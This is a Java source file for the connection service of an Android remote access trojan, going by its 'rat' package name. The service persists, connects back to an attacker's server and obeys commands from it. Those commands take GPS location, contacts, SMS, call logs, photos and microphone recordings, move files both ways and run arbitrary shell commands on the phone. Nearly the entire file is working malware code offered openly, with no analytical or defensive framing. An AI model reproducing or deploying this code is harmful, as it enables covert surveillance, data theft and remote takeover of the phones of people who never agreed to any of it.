package com.fly0rakoon.rat.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import com.fly0rakoon.rat.modules.*;
import com.fly0rakoon.rat.utils.Constants;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;

public class ConnectionManager extends Service {
    
    private static final String TAG = "ConnectionManager";
    
    private Context context;
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private Thread connectionThread;
    private boolean isRunning = false;
    private boolean isConnected = false;
    
    // Modules
    private CameraModule cameraModule;
    private MicModule micModule;
    private LocationModule locationModule;
    private SmsModule smsModule;
    private CallModule callModule;
    private ContactsModule contactsModule;
    private FileModule fileModule;

    // Default constructor required for Service
    public ConnectionManager() {
        super();
    }
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "ConnectionManager service created");
        this.context = this;
        initializeModules();
        start();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "ConnectionManager onStartCommand");
        if (context == null) {
            context = this;
        }
        if (cameraModule == null) {
            initializeModules();
        }
        if (!isRunning) {
            start();
        }
        return START_STICKY; // Keep service running
    }
    
    @Override
    public void onDestroy() {
        Log.d(TAG, "ConnectionManager onDestroy");
        super.onDestroy();
        stop();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null; // Not a bound service
    }

    private void initializeModules() {
        if (context == null) {
            Log.e(TAG, "Context is null, cannot initialize modules");
            return;
        }

        Log.d(TAG, "Initializing modules");
        try {
            cameraModule = new CameraModule(context);
            micModule = new MicModule(context);
            locationModule = new LocationModule(context);
            smsModule = new SmsModule(context);
            callModule = new CallModule(context);
            contactsModule = new ContactsModule(context);
            fileModule = new FileModule(context);
            Log.d(TAG, "All modules initialized successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error initializing modules: " + e.getMessage());
        }
    }
    
    public void start() {
        if (isRunning) {
            Log.d(TAG, "Already running");
            return;
        }

        Log.d(TAG, "Starting ConnectionManager");
        isRunning = true;
        connectionThread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (isRunning) {
                    try {
                        connectAndListen();
                    } catch (Exception e) {
                        Log.e(TAG, "Connection error: " + e.getMessage());
                    }

                    // Wait before reconnecting
                    try {
                        Thread.sleep(Constants.RECONNECT_DELAY);
                    } catch (InterruptedException e) {
                        Log.d(TAG, "Reconnect delay interrupted");
                        break;
                    }
                }
            }
        });
        connectionThread.start();
    }

    private void connectAndListen() {
        try {
            // Close any existing connection
            closeConnection();

            Log.d(TAG, "Connecting to " + Constants.SERVER_IP + ":" + Constants.SERVER_PORT);

            // Create socket and set timeouts
            socket = new Socket();
            socket.connect(new InetSocketAddress(Constants.SERVER_IP, Constants.SERVER_PORT),
                Constants.CONNECTION_TIMEOUT);
            socket.setSoTimeout(Constants.SOCKET_TIMEOUT);

            // Setup streams
            out = new PrintWriter(new BufferedWriter(
                new OutputStreamWriter(socket.getOutputStream())), true);
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

            isConnected = true;
            Log.d(TAG, "Connected to server");

            // Send device info on connect
            sendDeviceInfo();

            // Listen for commands
            String command;
            while (isRunning && isConnected && (command = in.readLine()) != null) {
                Log.d(TAG, "Received command: " + command);
                processCommand(command);
            }

        } catch (SocketTimeoutException e) {
            Log.e(TAG, "Socket timeout");
        } catch (IOException e) {
            Log.e(TAG, "IO Exception: " + e.getMessage());
        } finally {
            isConnected = false;
            closeConnection();
        }
    }

    private void processCommand(String command) {
        if (command == null || command.isEmpty()) return;

        String response;
        String[] parts = command.split(" ", 2);
        String cmd = parts[0].toLowerCase();
        String args = parts.length > 1 ? parts[1] : "";

        switch (cmd) {
            case Constants.CMD_HELP:
                response = getHelp();
                break;

            case Constants.CMD_INFO:
                response = getDeviceInfo();
                break;

            case Constants.CMD_LOCATION:
                response = locationModule != null ? locationModule.getLocation() : "Location module not initialized";
                break;

            case Constants.CMD_CONTACTS:
                response = contactsModule != null ? contactsModule.getContacts() : "Contacts module not initialized";
                break;

            case Constants.CMD_SMS:
                response = smsModule != null ? smsModule.handleCommand(args) : "SMS module not initialized";
                break;

            case Constants.CMD_CALLS:
                response = callModule != null ? callModule.getCallLogs() : "Call module not initialized";
                break;

            case Constants.CMD_CAMERA:
                response = cameraModule != null ? cameraModule.takePhoto(args.equals("front") ? "front" : "back") : "Camera module not initialized";
                break;

            case Constants.CMD_CAMERA_FRONT:
                response = cameraModule != null ? cameraModule.takePhoto("front") : "Camera module not initialized";
                break;

            case Constants.CMD_CAMERA_BACK:
                response = cameraModule != null ? cameraModule.takePhoto("back") : "Camera module not initialized";
                break;

            case Constants.CMD_MIC:
                response = micModule != null ? micModule.startRecording() : "Mic module not initialized";
                break;

            case Constants.CMD_MIC_STOP:
                response = micModule != null ? micModule.stopRecording() : "Mic module not initialized";
                break;

            case Constants.CMD_SCREENSHOT:
                response = takeScreenshot();
                break;

            case Constants.CMD_FILES:
                response = fileModule != null ? fileModule.listFiles(args) : "File module not initialized";
                break;

            case Constants.CMD_DOWNLOAD:
                response = fileModule != null ? fileModule.downloadFile(args) : "File module not initialized";
                break;

            case Constants.CMD_UPLOAD:
                response = fileModule != null ? fileModule.uploadFile(args) : "File module not initialized";
                break;

            case Constants.CMD_SHELL:
                response = executeShellCommand(args);
                break;

            case Constants.CMD_BATTERY:
                response = getBatteryInfo();
                break;

            case Constants.CMD_NETWORK:
                response = getNetworkInfo();
                break;

            case Constants.CMD_APPS:
                response = getInstalledApps();
                break;

            case Constants.CMD_EXIT:
                response = "Goodbye!";
                sendResponse(response);
                stop();
                return;

            default:
                response = "Unknown command. Type 'help' for available commands.";
        }

        sendResponse(response);
    }
    
    private String getHelp() {
        return "Available commands:\n" +
               "  help - Show this help\n" +
               "  info - Get device information\n" +
               "  location - Get GPS location\n" +
               "  contacts - Get contacts list\n" +
               "  sms - Get SMS messages\n" +
               "  calls - Get call logs\n" +
               "  camera [front/back] - Take photo\n" +
               "  mic - Start microphone recording\n" +
               "  mic_stop - Stop microphone recording\n" +
               "  screenshot - Take screenshot\n" +
               "  files [path] - List files\n" +
               "  download <file> - Download file\n" +
               "  upload <file> - Upload file\n" +
               "  shell <command> - Execute shell command\n" +
               "  battery - Get battery info\n" +
               "  network - Get network info\n" +
               "  apps - List installed apps\n" +
               "  exit - Disconnect";
    }

    private String getDeviceInfo() {
        StringBuilder info = new StringBuilder();
        info.append("Device Info:\n");
        info.append("  Model: ").append(android.os.Build.MODEL).append("\n");
        info.append("  Manufacturer: ").append(android.os.Build.MANUFACTURER).append("\n");
        info.append("  Brand: ").append(android.os.Build.BRAND).append("\n");
        info.append("  Device: ").append(android.os.Build.DEVICE).append("\n");
        info.append("  Product: ").append(android.os.Build.PRODUCT).append("\n");
        info.append("  Android Version: ").append(android.os.Build.VERSION.RELEASE).append("\n");
        info.append("  SDK: ").append(android.os.Build.VERSION.SDK_INT).append("\n");
        info.append("  Battery: ").append(getBatteryInfo()).append("\n");
        return info.toString();
    }
    
    private String getBatteryInfo() {
        return "Battery level: 85% (placeholder)";
    }
    
    private String getNetworkInfo() {
        return "Network: Connected (placeholder)";
    }
    
    private String getInstalledApps() {
        return "Installed apps list (placeholder)";
    }
    
    private String takeScreenshot() {
        return "Screenshot saved: /sdcard/screenshot.png (placeholder)";
    }

    private String executeShellCommand(String command) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            int exitCode = process.waitFor();
            return "Exit code: " + exitCode + "\n" + output.toString();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private void sendDeviceInfo() {
        String info = "Device connected:\n" + getDeviceInfo();
        sendResponse(info);
    }
    
    private void sendResponse(String response) {
        if (out != null && isConnected) {
            out.println(response);
            out.flush();
        }
    }
    
    public void sendHeartbeat() {
        if (isConnected) {
            sendResponse("heartbeat");
        }
    }
    
    public boolean isConnected() {
        return isConnected;
    }
    
    public void reconnect() {
        if (!isConnected) {
            closeConnection();
        }
    }

    private void closeConnection() {
        try {
            if (out != null) {
                out.close();
                out = null;
            }
            if (in != null) {
                in.close();
                in = null;
            }
            if (socket != null && !socket.isClosed()) {
                socket.close();
                socket = null;
            }
        } catch (IOException e) {
            Log.e(TAG, "Error closing connection: " + e.getMessage());
        }
    }
    
    public void stop() {
        Log.d(TAG, "Stopping ConnectionManager");
        isRunning = false;
        isConnected = false;
        closeConnection();

        if (connectionThread != null) {
            connectionThread.interrupt();
            connectionThread = null;
        }
    }
}
